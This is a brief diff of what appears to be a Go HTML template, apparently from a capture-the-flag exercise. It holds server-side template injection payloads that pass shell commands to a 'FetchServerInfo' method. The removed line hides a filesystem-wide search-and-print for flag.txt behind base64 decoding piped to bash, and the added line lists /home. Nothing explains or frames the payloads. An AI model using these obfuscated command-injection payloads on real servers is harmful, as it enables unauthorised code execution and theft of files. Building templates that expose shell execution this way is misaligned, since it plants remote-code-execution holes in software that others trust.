@@ -6,7 +6,7 @@
   <body>
   <div>
 
-  {{.FetchServerInfo "echo ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsIC1leGVjICdjYXQnIHt9IFw7 | base64 -d | bash"}}
+  {{.FetchServerInfo "ls /home/"}}
 </div>
  
 
